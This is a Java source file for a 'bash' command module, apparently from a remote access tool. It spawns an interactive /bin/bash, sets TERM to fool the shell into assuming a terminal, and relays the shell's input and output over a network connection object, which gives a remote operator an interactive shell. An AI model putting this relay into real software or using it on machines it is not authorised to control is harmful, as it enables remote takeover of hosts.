package commands.shells;

//get access to a linux terminal
//imports
import terminal.*;
import remote.*;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.IOException;

public class BashCommand {
	//variables
	//constructors
	public BashCommand() {

	}//end of default constructor
	
	//methods
	//spawn a sh linux terminal
	public void execute(Connection conn, String command){
		//check if you are not on windows
		if (Terminal.os.contains("Windows")){
			//System.out.println("\nyou are not on nix machine\n");
			conn.writeDisln("\nyou are not on nix machine\n");
			return;
		}

		//pause shell that is currently running
		//Terminal.pauseShell();

		//try catch for processbuilder
		try {
			//System.out.println("dropping into shell");
			conn.writeDisln("\ndropping into shell\n");
			ProcessBuilder pb = new ProcessBuilder("/bin/bash","-i").redirectErrorStream(true);
			//the below will not work with a remote access tool
			//pb.inheritIO();
			//make shell think a tty exists
			pb.environment().put("TERM","xterm");

			//start the process
			Process p = pb.start();

			//get all the input streams
			InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = conn.getDefaultIn();

			//get all the output streams
			OutputStream po = p.getOutputStream(), so = conn.getDefaultOut();

			//start while loop to read and write to the different streams
			while(p.isAlive()){
			       //check if there is input from process
			       while(pi.available()>0){
				       //read from process and write to socket
				       so.write(pi.read());
			       }
			       //check if there are errors from process
			       while(pe.available()>0){
				       //read errors and write to socket
				       so.write(pe.read());
			       }
			       //check if there is input from the socket
			       //then write to the process
			       while(si.available()>0){
				       //read from socket
				       //and write to the process
				       po.write(si.read());
			       }
			       //flush the output streams
			       so.flush();
			       po.flush();

			       //sleep for 50 milliseconds
			       Thread.sleep(50);
			}	       
		} catch (IOException ioe){
			//conn.writeDisln("\n" + ioe.printStackTrace() + "\n");
			conn.writeDisln("\n" + ioe.getLocalizedMessage() + "\n");
		} catch (Exception e){
			e.printStackTrace();
		}//end of try catch
		//Terminal.startShell();
		conn.writeDisln("\nresuming java shell\n");
	}//end of execute one argument method
	
	//print help if any arguments are provided
	public void execute(Connection conn, String command, String args){
		//check if -h is used
		if (args.equals("-h")){
			help(conn);
		} else {
			//print some descriptive help
			//System.out.println("\narguments will not be interpreted\n");
			conn.writeDisln("\narguments will not be interpreted\n");
			execute(conn, command);
		}
	}//end of execute method with two arguments
	
	//help output
	public void help(Connection conn){
		//display help information for this command
		//System.out.println("\nsh - help information\n");
		//System.out.println("drops into a sh prompt\n");
		//System.out.println("\t-h\tprints help information");
		conn.writeDisln("\nbash - help information\n");
		conn.writeDisln("drops into a bash prompt\n");
		conn.writeDisln("\t-h\tprints help information");
	}//end of help method
}//end of ShCommand class